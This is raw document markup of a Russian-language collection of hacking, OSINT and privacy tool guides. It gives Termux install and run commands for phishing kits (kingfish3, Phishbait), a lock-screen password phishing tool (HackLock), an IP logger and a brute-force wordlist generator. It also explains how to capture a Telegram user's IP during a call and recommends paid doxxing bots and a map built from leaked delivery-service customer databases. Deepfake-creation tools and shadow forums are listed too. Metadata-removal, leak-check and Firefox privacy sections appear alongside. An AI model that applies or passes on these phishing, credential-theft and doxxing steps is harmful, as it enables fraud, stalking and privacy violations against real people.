      <text:p text:style-name="P1"><text:span text:style-name="T3">Показ </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">-адреса в браузера и Карт </text:span><text:span text:style-name="T2">Google</text:span><text:span text:style-name="T3">).</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Установка:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ apt-get install python</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ git clone https://github.com/Deadpool2000/IPicker.git</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ cd IPicker</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Использование</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T1"><text:span text:style-name="T2">$ python ipicker.py</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T1"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">Termux</text:span></text:p>
      <text:p text:style-name="P2">#работает</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">Snap</text:span><text:span text:style-name="T3"> (резервное копирование </text:span><text:span text:style-name="T2">Termux</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Установка:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ apt-get update -y</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ apt-get upgrade -y</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ pkg install python -y</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ pkg install python2 -y</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">$ pkg install git -y</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ pip install lolcat</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ git clone https://github.com/noob-hackers/snap</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ cd $HOME</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ cd snap</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">$ bash snap.sh</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">Termux</text:span></text:p>
      <text:p text:style-name="P2">#работает</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">Pydictor</text:span><text:span text:style-name="T3"> (словарь для атаки грубой силы)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Установка</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">pkg install python</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">pkg install git</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">git clone <text:s/>- depth=1 <text:s/>- branch=master https://www.github.com/landgrey/pydictor.git </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">cd pydictor/</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">chmod +x pydictor.py</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Использование</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">python pydictor.py <text:s/>- sedb</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">#Termux</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2">#не_работает</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">Shodan</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">eye</text:span><text:span text:style-name="T3"> (поиск хоста и прочее)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Установка:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ update -y &amp;&amp; apt upgrade -y</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ apt install git python -y</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ git clone https://github.com/BullsEye0/shodan-eye.git</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ cd shodan-eye</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ pip3 install -r requirements.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2">Использование:</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">python</text:span><text:span text:style-name="T3">3 </text:span><text:span text:style-name="T2">shodan</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">eye</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">py</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">Но для того, чтобы использовать инструмент, потребуется </text:span><text:span text:style-name="T2">API</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Key</text:span><text:span text:style-name="T3">, который можно получить на главной странице </text:span><text:span text:style-name="T2">Shodan</text:span><text:span text:style-name="T3"> - </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">shodan</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">io</text:span><text:span text:style-name="T3">/</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">#Termux</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">#фишинг</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Установка:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">pkg install git</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">pkg install python</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T1"><text:span text:style-name="T2">pkg install php</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T1"><text:span text:style-name="T2">pkg install openssh</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">git clone https://github.com/termux-lab/kingfish3</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">pip3 install prettytable</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Запуск:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">cd kingfish3</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">python</text:span><text:span text:style-name="T3">3 </text:span><text:span text:style-name="T2">fsh</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">py</text:span></text:p>
      <text:p text:style-name="P2">Использование:</text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">Выбираем что хотим фишить, если нужно больше, то выбирайте </text:span><text:span text:style-name="T2">Social</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Master</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">Termux</text:span></text:p>
      <text:p text:style-name="P2">#фишинг</text:p>
      <text:p text:style-name="P2">Установка:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">pkg</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">update</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">y</text:span><text:span text:style-name="T3"> &amp;&amp; </text:span><text:span text:style-name="T2">pkg</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">upgrade</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">y</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">git clone https://github.com/Err0r-ICA/Phishbait</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Запуск:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">cd Phishbait</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">bash Phishbait</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">#Termux</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2">#Проверка_почт_на_сайтах</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">Holehe</text:span><text:span text:style-name="T3"> - консольный инструмент, который поможет проверить, где зарегистрирована почта.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Установка:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">apt update &amp;&amp; apt upgrade</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">apt install python</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">pip3 install holehe</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">holehe -e ПОЧТА</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">Результаты:</text:span></text:p>
      <text:p text:style-name="P2">Зеленый цвет - зарегистрирована;</text:p>
      <text:p text:style-name="P2">Розовый - почта не зарегистрирована;</text:p>
      <text:p text:style-name="P2">Красный - не удалось проверить.</text:p>
      <text:p text:style-name="P2">Пробив по TikTok в Termux</text:p>
      <text:p text:style-name="P2">Установка:</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sc</text:span><text:span text:style-name="T3">1341/</text:span><text:span text:style-name="T2">TikTok</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">OSINT</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">cd TikTok-OSINT</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Использование</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">pip3 install requests</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">pip3 install beautifulsoup4</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">pip3 install argparse</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">python tiktokOSINT.py --username USERNAMEHERE --downloadProfilePic</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P6">По завершению работы утилита соберёт информацию об аккаунте и отобразит её в терминале.</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">Termux</text:span></text:p>
      <text:p text:style-name="P2">#HackLock для взлома экрана блокировок</text:p>
      <text:p text:style-name="P3">#Данная утилита позволяет произвести атаки социальной инженерии для получения пароля от экрана блокировки.</text:p>
      <text:p text:style-name="P3">Примечательно то, что дизайн страницы будет отображаться по-разному, в зависимости от того, с какого устройства был произведён на неё вход.</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">#</text:span><text:span text:style-name="T3">Установка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> Termux:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">apt-get update</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">apt-get upgrade</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">pkg install python -y</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">pkg install python2 -y</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">pkg install git -y</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">pip install lolcat</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">git clone https://github.com/noob-hackers/hacklock</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">cd hacklock</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">bash setup</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">bash hacklock.sh</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4"><text:soft-page-break/><text:span text:style-name="T3">Далее вы выбираете метод туннелирования и на экране отображается желаемая ссылка.</text:span></text:p>
      <text:p text:style-name="P2">Подборка чекеров. Часть 4.</text:p>
      <text:p text:style-name="P2">Они необходимы как минимум для того, что бы проверить качество вашего VPN и не происходит ли утечки вашего реального IP через WebRTC.</text:p>
      <text:p text:style-name="P2">1. https://tenta.com/test/</text:p>
      <text:p text:style-name="P2">2. https://whatismyipaddress.com/</text:p>
      <text:p text:style-name="P2">3. https://ipinfo.info/html/privacy-check.php</text:p>
      <text:p text:style-name="P2">4. https://who.is/</text:p>
      <text:p text:style-name="P7">5. https://www.ip2location.com/demo</text:p>
      <text:p text:style-name="P2">WebRTC Leak Shield <text:s/>- браузерное расширения для предотвращения утечки вашего IP адреса через WebRTC. </text:p>
      <text:p text:style-name="P6">Достаточно просто ввести в поиске канала "WebRTC", если хотите полностью разобраться в вопросе и забыть об этой утечке. </text:p>
      <text:p text:style-name="P2">Подборка инструментов редактирования и удаления метаданных</text:p>
      <text:p text:style-name="P2">1.Scrambled Exif (https://f-droid.org/en/packages/com.jarsilio.android.scrambledeggsif/) - приложение для удаления метаданных с фотографий перед их отправкой. Для пользователей Android.</text:p>
      <text:p text:style-name="P2">2. Imgonline - сервис, который позволяет удалить с фотографии EXIF, IPTC, XMP метаданные и другую дополнительную информацию, кроме самого изображения.</text:p>
      <text:p text:style-name="P2">3. MAT2 - бесплатный софт с открытым исходным кодом для удаления всех метаданных с фотографий, аудио, документов и торрент-файлов.</text:p>
      <text:p text:style-name="P2">4. Imagepipe (https://f-droid.org/packages/de.kaffeemitkoffein.imagepipe/) - также удаляет данные EXIF перед отправкой изображения. Для пользователей Android.</text:p>
      <text:p text:style-name="P8">5. Exif Viewer (http://exif-viewer.com/) - извлекает метаданные из различных файлов.</text:p>
      <text:p text:style-name="P8">6. Jeffrey's Image Metadata Viewer (http://exif.regex.info/exif.cgi) - извлекает метаданные из изображений. </text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">7. Get Metadata (http://www.get-metadata.com/) - извлекает метаданные из различных типов файлов. </text:span></text:p>
      <text:p text:style-name="P2">8. MetaClean - <text:s/>он-лайн инструмент для работы с PDF, JPEG, MP3, Docx и другими форматами. </text:p>
      <text:p text:style-name="P2">9. ExifCleaner - <text:s/>бесплатный софт с открытым исходным кодом, который позволяет удалять метаданные с фотографий, гифок, видео и PDF файлов.</text:p>
      <text:p text:style-name="P6">10. MetaCleaner - комплексный и профессиональный онлайн-инструмент для удаления метаданных.</text:p>
      <text:p text:style-name="P2">Узнаём IP-адрес Telegram-пользователя по звонку через Kali Linux</text:p>
      <text:p text:style-name="P2">Wireshark является по умолчанию предустановленной утилитой и мы воспользуемся ей для просмотра сетевого трафика и выявления IP-адреса цели.</text:p>
      <text:p text:style-name="P2">1. Звоним пользователю по Telegram;</text:p>
      <text:p text:style-name="P2">2. Запускаем WireShark;</text:p>
      <text:p text:style-name="P2">3. Нажимаем на лупу (Найти пакет) и видим, как у нас появляется новая строка с параметрами и поисковой строкой. Там выбираем параметр "Строка";</text:p>
      <text:p text:style-name="P2">4. В строке нам надо написать XDR-MAPPED-ADDRESS;</text:p>
      <text:p text:style-name="P2">5. Чтобы понять, какой именно IP нам нужен, жмём уже в настроенном поисковике "Найти", ищем в строке XDR-MAPPED-ADDRESS а то, что идёт после него и есть нужный нам IP.</text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">Для защиты требуется перейти в настройках телеграмма во вкладку "Конфиденциальность" и поставить запрет на осуществление звонков на ваш аккаунт.</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2">Подборка OSINT инструментов. Часть 15. Telegram.</text:p>
      <text:p text:style-name="P2">1. The Dark Lord (https://t.me/Probiv2_bot?start=145016585) - легенда пробива, тот самый «глаз», который постоянно все ищут. Держите рабочее зеркало. </text:p>
      <text:p text:style-name="P2">2. Maigret (https://t.me/maigret_osint_bot) - <text:s/>бот для поиска по никнейму во всевозможных соцсетях и ресурсах.</text:p>
      <text:p text:style-name="P2">3. Insight <text:s/>(https://t.me/eyeofbeholder_bot) - <text:s/>бот, показывающий интересы пользователя в Telegram. Учитывает все чаты, в которых вы когда-либо были. </text:p>
      <text:p text:style-name="P9"><text:soft-page-break/><text:span text:style-name="T3">4. HimeraSearch <text:s/>(https://t.me/HimeraSearchBot?start=145016585) - <text:s/>самый дорогой пробив-бот, но выдает много информации. Например, историю перелетов и жд поездок, адреса клиник, где пробиваемый лечился и т. д.</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T2">5</text:span><text:span text:style-name="T3">. Saverudata <text:s/>(https://saverudata.online/) - <text:s/>карта, возникшая из слитой базы клиентов Яндекс.Еды. Сейчас в неё добавили другие базы, например СДЭК. Бесплатный инструмент.</text:span></text:p>
      <text:p text:style-name="P2">Определяем фотошоп и генерацию лиц ИИ:</text:p>
      <text:p text:style-name="P2">1. Forensically - комплексный инструмент проверки фотографий на предмет изменений. </text:p>
      <text:p text:style-name="P2">2. Foto Forsenics - <text:s text:c="2"/>сайт для криминалистического анализа фотографий, который позволяет понять, были ли они изменены в любом из редакторов. </text:p>
      <text:p text:style-name="P11">3. Fake Profile Detector (https://chrome.google.com/webstore/detail/fake-profile-detector-dee/jbpcgcnnhmjmajjkgdaogpgefbnokpcc) - браузерное расширение, позволяющее проверить фото лица на предмет генерации его ИИ.</text:p>
      <text:p text:style-name="P8">Делаем DeepFake видео </text:p>
      <text:p text:style-name="P2">1. DeepFaceLive (https://github.com/iperov/DeepFaceLive) - софт для замены лица в режиме реального времени для потоковой передачи на ПК или видеозвонков. От создателей популярной библиотеки DeepFaceLab (https://github.com/iperov/DeepFaceLab). Прилагаю неплохую инструкцию.</text:p>
      <text:p text:style-name="P2"><text:s/>(https://proglib.io/p/deepfake-tutorial-sozdaem-sobstvennyy-dipfeyk-v-deepfacelab-2019-11-16)</text:p>
      <text:p text:style-name="P2">2. Round DeepFake - записываем Deep Fake "кружочки" в Telegram. Больше побаловаться. </text:p>
      <text:p text:style-name="P2">3. DeepFakes Web (https://deepfakesweb.com/) - платный сайт, где можно сделать видео за 2$.</text:p>
      <text:p text:style-name="P2">4. FaceSwap (https://github.com/deepfakes/faceswap) - похож на DeepFaceLab, но предоставляет больше возможностей, лучшую документацию и лучшую онлайн-поддержку. И да, он также доступен на Mac и Linux</text:p>
      <text:p text:style-name="P2">Определяем DeepFake на видео:</text:p>
      <text:p text:style-name="P2">1. https://deepware.ai/ - бесплатный сервис для проверки видео на подлинность. Также доступно в Google Play (https://play.google.com/store/apps/details?id=com.zemana.deepware).</text:p>
      <text:p text:style-name="P4"><text:soft-page-break/><text:span text:style-name="T3">2. DFSpot-Deepfake-Recognition (https://github.com/chinmaynehate/DFSpot-Deepfake-Recognition) - нейросетевая модель, <text:s/>которая <text:s/>определяет, является ли входное видео/изображение реальным или Deepfake. <text:s/></text:span></text:p>
      <text:p text:style-name="P2">Преврати смартфон во что хочешь</text:p>
      <text:p text:style-name="P2">1. Haven - приложение, которое превратит ваш смартфон в полноценную камеру видеонаблюдения c фиксацией движений и вибраций. </text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">2.</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">MetalSniffer (https://play.google.com/store/apps/details?id=com.icechen1.metalsniffer) - превращает смартфон в портативный детектор сигналов и скрытых устройств.</text:span></text:p>
      <text:p text:style-name="P2">3. Hidden Camera Detector (https://play.google.com/store/apps/details?id=hiddencamdetector.futureapps.com.hiddencamdetector) - приложение для обнаружения скрытых камер посредством инфракрасных и магнитных сенсоров смартфона.</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">4.</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">Fing (https://play.google.com/store/apps/details?id=com.overlook.android.fing&amp;hl=en_US) - превращает смартфон в Wi-Fi сканнер сетей, в том числе можно смотреть, какие устройства подключены к определенному Wi-Fi.</text:span></text:p>
      <text:p text:style-name="P2">5. tinyCam Monitor (http://tinycammonitor.com/) - приложение для подключения смартфона к любому виду камер. </text:p>
      <text:p text:style-name="P6">6. AirGap - приложение для превращения вашего старого телефона в холодный кошелёк для хранения криптовалют. Открытый исходный код, регулярные обновления.</text:p>
      <text:p text:style-name="P2">Меняем голос на записи и онлайн</text:p>
      <text:p text:style-name="P12">1. Voice Changer (https://voicechanger.io/) - загружаем запись своей речи и выбираем нужный нам эффект изменения голоса. Есть real-time функция записи прямо на сайте.</text:p>
      <text:p text:style-name="P12">2. Online Tone Generator (https://onlinetonegenerator.com/pitch-shifter.html) - похуже, без изменения голоса в режиме real-time, но с кучей настроек. Можно редактировать голос в файле. </text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">3.</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">Voice</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">Changer</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">(Android) (https://play.google.com/store/apps/details?id=com.ponicamedia.voicechanger) - <text:s/>бесплатное приложение с функциями изменения голоса для пользователей Android.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">4. Voice Spice (https://voicespice.com/) - простой рекордер, который позволяет записывать голос, меняя тональность и громкость в режиме реального времени или задавая готовые настройки, дабы имитировать речь мужчины, женщины, робота, космической белки, адского демона и так далее. </text:span></text:p>
      <text:p text:style-name="P2">5. Voice Changer Plus (iOS) (https://apps.apple.com/ru/app/voice-changer-plus/id339440515) - еще одно бесплатное приложение для работы с голосом.</text:p>
      <text:p text:style-name="P2">6. VIPole Secure Messenger - есть функция изменения голоса при звонке. </text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">7.</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">TurboTel (https://play.google.com/store/apps/details?id=ellipi.messenger&amp;hl=ru&amp;gl=US) - Telegram-клиент с функцией изменения голоса при отправке аудисообщения.</text:span></text:p>
      <text:p text:style-name="P2">Создаем зашифрованную галерею </text:p>
      <text:p text:style-name="P2">1. ente - простой, защищенный сквозным шифрованием, сервис хранения фотографий с открытым исходным кодом и фокусом на конфиденциальность.</text:p>
      <text:p text:style-name="P2">2. Stingle Photos - альтернатива обычной галерее в вашем смартфоне, но с шифрованием и возможностью делать бэкапы. </text:p>
      <text:p text:style-name="P2">3. Neo Vault (https://play.google.com/store/apps/details?id=com.x3ntech.neoVault) - бесплатное приложение для пользователей Android, позволяющее создать зашифрованную галерею и защитить её ПИН-кодом или отпечатком пальца (лучше первое).</text:p>
      <text:p text:style-name="P2">4. Cryptocam - приложение для создания зашифрованных фото и видео. Получить к ним доступ возможно только с другого устройства, предварительно расшифровав все паролем.</text:p>
      <text:p text:style-name="P7">5. Calc Box - фейковый калькулятор, в которой можно спрятать фотографии и видео. Для пользователей Android. Еще я упоминал Calculator Vault , они похожи.</text:p>
      <text:p text:style-name="P2">Подборка теневых форумов ч1</text:p>
      <text:p text:style-name="P13">3. AntiMigalki (https://antimigalki.live/) - широкопрофильный теневой форум. (Clear)</text:p>
      <text:p text:style-name="P14">5. BHF (https://bhf.io/) - еще один старый хак-форум (Clear)</text:p>
      <text:p text:style-name="P2">Firefox: настройки приватности в "about:config"</text:p>
      <text:p text:style-name="P2">privacy.firstparty.isolate = true</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">Включенная настройка изолирует браузерные идентификаторы (например, куки) в текущем домене, препятствуя трекингу на других доменах. Не используй одновременно с расширением Cookie AutoDelete!</text:span></text:p>
      <text:p text:style-name="P2">privacy.resistFingerprinting = true</text:p>
      <text:p text:style-name="P2">Включенная настройка усложняет твою идентификацию по браузерному отпечатку.</text:p>
      <text:p text:style-name="P2">privacy.trackingprotection.enabled = true</text:p>
      <text:p text:style-name="P2">Встроенная защита от трекинга. Использует фильтры Disconnect.me, поэтому бесполезна при одновременном использовании с uBlock Origin.</text:p>
      <text:p text:style-name="P2">browser.cache.offline.enable = false</text:p>
      <text:p text:style-name="P2">Отключение локального кэша.</text:p>
      <text:p text:style-name="P2">browser.safebrowsing.malware.enabled = false</text:p>
      <text:p text:style-name="P2">Отключение механизма проверки на вредоносы Google Safe Browsing. Снижает безопасность, но повышает приватность.</text:p>
      <text:p text:style-name="P2">browser.safebrowsing.phishing.enabled = false</text:p>
      <text:p text:style-name="P2">Отключение механизма проверки на фишинг Google Safe Browsing. Снижает безопасность, но повышает приватность.</text:p>
      <text:p text:style-name="P2">browser.send_pings = false</text:p>
      <text:p text:style-name="P2">Запрет на трекинг пользовательских кликов.</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">browser.sessionstore.max_tabs_undo = 0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2">Запрет на временное хранение недавно закрытых вкладок, доступных в меню "Журнал -&gt; Недавно закрытые вкладки".</text:p>
      <text:p text:style-name="P2">browser.urlbar.speculativeConnect.enabled = false</text:p>
      <text:p text:style-name="P2">Отключение предзагрузки автозаполнения URL. Позволяет избежать утечки через сторонние сервисы при наборе текста в адресной строке (источник)</text:p>
      <text:p text:style-name="P2">dom.battery.enabled = false</text:p>
      <text:p text:style-name="P2">Отключение возможности получения данных о заряде батареи на устройстве (источник)</text:p>
      <text:p text:style-name="P2">dom.event.clipboardevents.enabled = false</text:p>
      <text:p text:style-name="P2">Отключение уведомлений страниц о пользовательских действиях (копирования, вырезания и вставки), а также выделенных элементов.</text:p>
      <text:p text:style-name="P2">geo.enabled = false</text:p>
      <text:p text:style-name="P2">Отключение служб геолокации.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">media.navigator.enabled = false</text:span></text:p>
      <text:p text:style-name="P2">Запрет на трекинг статуса микрофона/камеры на устройстве.</text:p>
      <text:p text:style-name="P2">network.cookie.cookieBehavior = 1</text:p>
      <text:p text:style-name="P2">Управление куками</text:p>
      <text:p text:style-name="P2">0 = По умолчанию сохранять все куки</text:p>
      <text:p text:style-name="P2">1 = Сохранять куки только с текущего сайта (блокировать куки со сторонних сайтов)</text:p>
      <text:p text:style-name="P12">2 = По умолчанию блокировать все куки</text:p>
      <text:p text:style-name="P12">network.cookie.lifetimePolicy = 2</text:p>
